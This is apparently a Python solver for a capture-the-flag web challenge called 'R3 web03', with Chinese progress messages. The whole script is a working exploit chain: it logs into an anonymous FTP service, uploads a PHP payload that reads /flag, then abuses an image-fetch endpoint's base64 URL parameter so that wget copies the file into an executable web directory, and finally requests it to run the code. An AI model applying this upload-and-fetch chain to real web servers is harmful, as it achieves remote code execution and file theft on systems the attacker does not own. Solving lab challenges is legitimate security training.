#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Solve R3 web03 through the FTP application and its image-fetch companion."""
import argparse
import base64
import re
import secrets
import sys

import requests


PAYLOAD_NAME = "solve" + secrets.token_hex(5) + ".phtml"
PAYLOAD = "<?php echo file_get_contents('/flag'); ?>"


class Solver:
    def __init__(self, target, payload_name):
        self.target = target.rstrip("/")
        self.payload_name = payload_name
        self.session = requests.Session()
        self.session.trust_env = False

    def get(self, path, timeout=20):
        return self.session.get(self.target + path, timeout=timeout)

    def post(self, path, **kwargs):
        return self.session.post(self.target + path, timeout=20, **kwargs)

    def run(self):
        print("[1] 检查两个应用")
        for path in ("/", "/ftp.php", "/show.html"):
            response = self.get(path)
            print("    %-12s HTTP %d" % (path, response.status_code))
            if response.status_code != 200:
                return 2

        print("[2] 连接应用一提供的匿名 FTP")
        response = self.post("/ftp.php", data={
            "ftp_server": "127.0.0.1",
            "ftp_user": "anonymous",
            "ftp_pass": "x",
        })
        if response.status_code != 200 or "msg success" not in response.text:
            print("    FTP 登录失败")
            return 2
        print("    匿名 FTP 登录成功")

        source = self.get("/ftp.php?download=%2Fshow_img_v1.0.php")
        if source.status_code != 200 or "system(" not in source.text:
            print("    未能从 FTP 应用取回旧版图片处理源码")
            return 2
        print("[3] 从 FTP 根目录取回旧版源码，确认 wget 下载链")

        print("[4] 上传可读取实例 flag 的 PHP 文件到 FTP pub/")
        response = self.post("/ftp.php?dir=pub", files={
            "upload": (self.payload_name, PAYLOAD.encode(), "application/octet-stream"),
        })
        if response.status_code != 200 or "文件 " + self.payload_name + " 上传成功" not in response.text:
            print("    上传失败")
            return 2
        print("    上传成功：pub/" + self.payload_name)

        print("[5] 通过图片应用的本机 FTP 抓取功能，将文件放入可执行目录")
        image_url = "ftp://127.0.0.1/pub/" + self.payload_name
        encoded = base64.b64encode(image_url.encode()).decode("ascii")
        response = self.session.get(self.target + "/show_img.php", params={"img_url": encoded}, timeout=45)
        wget_message = re.sub(r"<[^>]*>", " ", response.text)
        print("    图片应用 HTTP %d；执行回显：%s" %
              (response.status_code, re.sub(r"\s+", " ", wget_message).strip()[:240]))
        if response.status_code != 200:
            print("    图片应用请求失败：HTTP %d" % response.status_code)
            return 2
        print("    本机 FTP 文件已交给 wget 下载")

        print("[6] 访问下载后的 PHP 文件")
        response = self.get("/temp_img/" + self.payload_name, timeout=20)
        print("    文件响应 HTTP %d，类型 %s，正文前 120 字节：%r" %
              (response.status_code, response.headers.get("Content-Type", ""), response.content[:120]))
        match = re.search(r"flag\{[^}\r\n]+\}", response.text)
        if response.status_code != 200 or not match:
            print("    当前实例未返回 flag；请检查镜像版本与容器日志")
            return 2
        print("[+] FLAG = " + match.group(0))
        return 0


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="http://127.0.0.1:8093",
                        help="靶机入口，默认 http://127.0.0.1:8093")
    parser.add_argument("--payload-name", default=PAYLOAD_NAME,
                        help="FTP 上传文件名，默认使用本次运行的唯一名称")
    args = parser.parse_args()
    sys.exit(Solver(args.target, args.payload_name).run())


if __name__ == "__main__":
    main()
